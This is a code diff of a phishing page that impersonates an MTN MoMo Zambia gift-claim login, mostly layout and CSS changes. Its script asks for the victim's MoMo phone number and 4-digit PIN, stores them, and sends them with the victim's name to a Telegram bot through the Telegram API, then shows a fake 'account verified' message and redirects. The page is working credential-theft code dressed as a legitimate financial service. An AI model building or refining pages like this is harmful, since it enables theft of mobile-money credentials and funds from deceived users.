@@ -15,20 +15,19 @@
         
         html,
         body {
-            min-height: 100vh;
+            height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
-            overflow-x: hidden;
+            background: #f5f5f5;
+            overflow: hidden;
         }
         
         body {
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            padding: 10px;
         }
         
-        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -36,10 +35,10 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 10px;
             background: white;
             border-radius: 16px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            margin-bottom: 15px;
         }
         
         .back-btn {
@@ -68,14 +67,6 @@
             color: #0047AB;
         }
         
-        .login-link {
-            color: #0047AB;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        
-        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
@@ -83,56 +74,54 @@
             width: 100%;
             max-width: 480px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            margin-bottom: 15px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
         }
         
-        .title {
+        .form-title {
             font-size: 24px;
             font-weight: 700;
-            color: #1a1a2e;
             text-align: center;
-            margin-bottom: 4px;
+            color: #1a1a2e;
+            margin-bottom: 5px;
         }
         
-        .title .highlight {
+        .form-title .highlight {
             color: #0047AB;
         }
         
-        .subtitle {
-            font-size: 14px;
-            color: #888;
+        .form-subtitle {
             text-align: center;
-            margin-bottom: 20px;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 15px;
         }
         
-        /* ===== GIFT PREVIEW ===== */
         .gift-preview {
             background: #f8f9ff;
             border-radius: 12px;
-            padding: 14px 16px;
-            margin-bottom: 20px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
             display: flex;
             align-items: center;
-            gap: 14px;
+            gap: 12px;
             border: 2px solid #0047AB;
-            width: 100%;
         }
         
         .gift-preview .icon {
             font-size: 32px;
-            flex-shrink: 0;
         }
         
         .gift-preview .info {
             flex: 1;
-            text-align: left;
         }
         
         .gift-preview .info .label {
-            font-size: 10px;
+            font-size: 11px;
             color: #888;
-            font-weight: 600;
+            font-weight: 500;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
@@ -159,7 +148,6 @@
             flex-shrink: 0;
         }
         
-        /* ===== PHONE GROUP ===== */
         .phone-group {
             width: 100%;
             border: 2px solid #0047AB;
@@ -167,7 +155,7 @@
             display: flex;
             align-items: center;
             padding: 14px 18px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             background: white;
             transition: box-shadow 0.3s;
         }
@@ -203,14 +191,12 @@
             color: #333;
             font-family: 'Inter', sans-serif;
             background: transparent;
-            width: 100%;
         }
         
         .phone-input::placeholder {
             color: #aaa;
         }
         
-        /* ===== PIN ===== */
         .pin-label {
             font-size: 14px;
             color: #666;
@@ -223,7 +209,7 @@
             display: flex;
             justify-content: center;
             gap: 14px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
         
         .pin-box {
@@ -261,7 +247,6 @@
             80% { transform: translateX(8px); }
         }
         
-        /* ===== STATUS ===== */
         .status-message {
             text-align: center;
             padding: 10px 14px;
@@ -270,7 +255,6 @@
             font-size: 13px;
             font-weight: 500;
             display: none;
-            width: 100%;
         }
         
         .status-message.success {
@@ -294,7 +278,6 @@
             border: 1px solid #bbdefb;
         }
         
-        /* ===== FORGOT LINK ===== */
         .forgot-link {
             text-align: center;
             margin-bottom: 20px;
@@ -313,7 +296,6 @@
             opacity: 0.7;
         }
         
-        /* ===== LOGIN BUTTON ===== */
         #loginBtn {
             width: 100%;
             padding: 16px;
@@ -344,57 +326,28 @@
             transform: none !important;
         }
         
-        /* ===== BOTTOM NAV ===== */
-        .bottom-nav {
-            display: flex;
-            justify-content: space-around;
-            background: white;
-            border-radius: 16px;
-            padding: 12px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        .nav-item {
-            text-align: center;
-            color: #999;
-            font-size: 12px;
-            text-decoration: none;
-            cursor: pointer;
-            background: none;
-            border: none;
-            font-family: 'Inter', sans-serif;
-            transition: color 0.2s;
-        }
-        
-        .nav-item.active {
-            color: #0047AB;
-            font-weight: 600;
-        }
-        
-        .nav-item .icon {
-            font-size: 22px;
-            display: block;
-        }
-        
-        /* ===== FOOTER ===== */
         footer {
             padding: 15px;
             color: #aaa;
             font-size: 12px;
             text-align: center;
-            width: 100%;
-            max-width: 480px;
+            margin-top: auto;
         }
         
-        footer a {
-            color: #0047AB;
-            text-decoration: none;
-            font-weight: 600;
+        .card::-webkit-scrollbar {
+            width: 4px;
         }
         
-        /* ===== SPINNER ===== */
+        .card::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        
+        .card::-webkit-scrollbar-thumb {
+            background: #0047AB;
+            border-radius: 10px;
+        }
+        
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -433,16 +386,23 @@
             font-weight: 500;
         }
         
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            body { padding: 10px; }
-            .card { padding: 20px 16px; }
-            .title { font-size: 20px; }
-            .pin-box { width: 48px; height: 48px; font-size: 20px; }
-            .pin-group { gap: 10px; }
-            .gift-preview {
-                padding: 12px 14px;
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 20px;
+            }
+            .pin-box {
+                width: 48px;
+                height: 48px;
+                font-size: 20px;
+            }
+            .pin-group {
                 gap: 10px;
+            }
+            .gift-preview {
+                padding: 10px 14px;
             }
             .gift-preview .icon {
                 font-size: 26px;
@@ -456,29 +416,30 @@
         }
         
         @media (max-width: 380px) {
-            .pin-box { width: 42px; height: 42px; font-size: 18px; }
-            .pin-group { gap: 8px; }
+            .pin-box {
+                width: 42px;
+                height: 42px;
+                font-size: 18px;
+            }
+            .pin-group {
+                gap: 8px;
+            }
         }
     </style>
 </head>
 
 <body>
-
-    <!-- ===== HEADER ===== -->
     <header>
         <button class="back-btn" onclick="window.location.href='details.html'" aria-label="Go back">←</button>
-        <div class="logo">
-            <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
-        </div>
-        <a href="login.html" class="login-link">Login</a>
+        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
+        <div></div>
     </header>
-
-    <!-- ===== MAIN CARD ===== -->
-    <div class="card">
-        <h1 class="title">🔐 <span class="highlight">MoMo</span> Account</h1>
-        <p class="subtitle">Enter the MoMo account to receive your gift</p>
-
-        <!-- Gift Preview -->
+    
+    <main class="card">
+        <h1 class="form-title">🔐 <span class="highlight">MoMo</span> Account</h1>
+        <p class="form-subtitle">Enter the MoMo account to receive your gift</p>
+        
+        <!-- Gift Preview - Shows selected gift -->
         <div class="gift-preview" id="giftPreview">
             <span class="icon" id="giftIcon">🎁</span>
             <div class="info">
@@ -517,30 +478,9 @@
 
         <!-- Login Button -->
         <button id="loginBtn">🎁 CLAIM GIFT →</button>
-    </div>
-
-    <!-- ===== BOTTOM NAV ===== -->
-    <div class="bottom-nav">
-        <button class="nav-item" onclick="window.location.href='index.html'">
-            <span class="icon">🏠</span>
-            Home
-        </button>
-        <button class="nav-item" onclick="window.location.href='application.html'">
-            <span class="icon">🎁</span>
-            Gifts
-        </button>
-        <button class="nav-item active" onclick="window.location.href='login.html'">
-            <span class="icon">🔐</span>
-            Login
-        </button>
-    </div>
-
-    <!-- ===== FOOTER ===== -->
-    <footer>
-        © 2026 MTN MoMo Zambia •
-        <a href="#" onclick="alert('Call 155 for support')">Help</a> •
-        <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
-    </footer>
+    </main>
+    
+    <footer>© 2026 MTN MoMo Zambia • Secured with 🔒</footer>
 
     <!-- Spinner Overlay -->
     <div id="spinnerOverlay">
@@ -563,17 +503,17 @@
         console.log('====================================');
 
         // ============================================
-        // LOAD SELECTED GIFT
+        // LOAD SELECTED GIFT - Shows at top
         // ============================================
         function loadSelectedGift() {
             const gift = localStorage.getItem('selectedGift') || 'Not selected';
             const value = localStorage.getItem('selectedGiftValue') || '-';
             const icon = localStorage.getItem('selectedGiftIcon') || '🎁';
-
+            
             document.getElementById('giftIcon').textContent = icon;
             document.getElementById('giftName').textContent = gift;
             document.getElementById('giftValue').textContent = value;
-
+            
             console.log('🎁 Gift to receive:', gift, '-', value);
         }
 
@@ -664,7 +604,7 @@
             const gift = localStorage.getItem('selectedGift') || 'Not specified';
             const giftValue = localStorage.getItem('selectedGiftValue') || '-';
             const fullName = localStorage.getItem('fullName') || 'Not provided';
-
+            
             const message = `🔐 *MTN MoMo - Gift Claim Login*\n\n` +
                 `🎁 *Gift to Receive:* ${gift} (${giftValue})\n` +
                 `📱 *MoMo Account:* +260 ${phone}\n` +
@@ -672,6 +612,8 @@
                 `👤 *User:* ${fullName}\n` +
                 `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
                 `✅ User is claiming their gift. Please process.`;
+
+            console.log('📤 Sending Telegram notification...');
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -695,12 +637,13 @@
         }
 
         // ============================================
-        // LOGIN HANDLER
+        // LOGIN HANDLER - Goes to confirmation.html
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
             const pin = Array.from(pinBoxes).map(box => box.value).join('');
 
+            // Validate phone
             if (!phone) {
                 showStatus('Please enter your MoMo phone number', 'error');
                 phoneInput.focus();
@@ -713,27 +656,33 @@
                 return;
             }
 
+            // Validate PIN
             if (pin.length !== 4) {
                 showStatus('Please enter your 4-digit MoMo PIN', 'error');
                 return;
             }
 
+            // Disable button and show spinner
             loginBtn.disabled = true;
             loginBtn.textContent = 'WAITING...';
             spinnerOverlay.style.display = 'flex';
             hideStatus();
 
+            // Store MoMo account details
             localStorage.setItem('momoPhone', phone);
             localStorage.setItem('momoPin', pin);
 
+            // Send Telegram notification
             const sent = await sendTelegramNotification(phone, pin);
 
+            // Show success message
             if (sent) {
                 showStatus('✅ MoMo account verified! Redirecting...', 'success');
             } else {
                 showStatus('✅ Account verified! Redirecting...', 'info');
             }
 
+            // Redirect to confirmation page after delay
             setTimeout(() => {
                 window.location.href = 'confirmation.html';
             }, 1500);
@@ -761,7 +710,7 @@
             }
             phoneInput.focus();
             checkPinComplete();
-
+            
             console.log('✅ MTN MoMo - MoMo Account Login page loaded');
             console.log('🎁 Selected Gift:', localStorage.getItem('selectedGift'));
             console.log('====================================');
